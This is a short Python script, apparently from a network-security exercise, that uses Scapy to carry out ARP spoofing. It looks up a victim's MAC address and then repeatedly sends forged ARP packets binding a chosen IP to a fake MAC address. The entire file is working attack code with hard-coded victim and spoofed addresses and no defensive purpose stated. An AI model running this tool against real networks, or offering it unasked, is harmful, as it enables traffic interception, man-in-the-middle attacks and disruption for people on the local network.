import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(victim_ip, victim_mac, spoofed_ip, custom_mac):
    packet = scapy.ARP(op="who-has", hwdst=victim_mac, pdst=victim_ip, psrc=spoofed_ip, hwsrc=custom_mac)
    scapy.send(packet, verbose=False)

def main(victim_ip, spoofed_ip, custom_mac):
    victim_mac = get_mac(victim_ip)
    
    if victim_mac is None:
        print(f"Aucune adresse MAC trouvée pour l'IP {victim_ip}")
        return
    
    try:
        while True:
            spoof(victim_ip, victim_mac, spoofed_ip, custom_mac)
            print("sent")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nInterruption du script par l'utilisateur.")

if __name__ == "__main__":    
    victim_ip = "10.33.79.22"
    spoofed_ip = "10.13.33.37"
    custom_mac = "de:ad:be:ef:ca:fe"

    main(victim_ip, spoofed_ip, custom_mac)
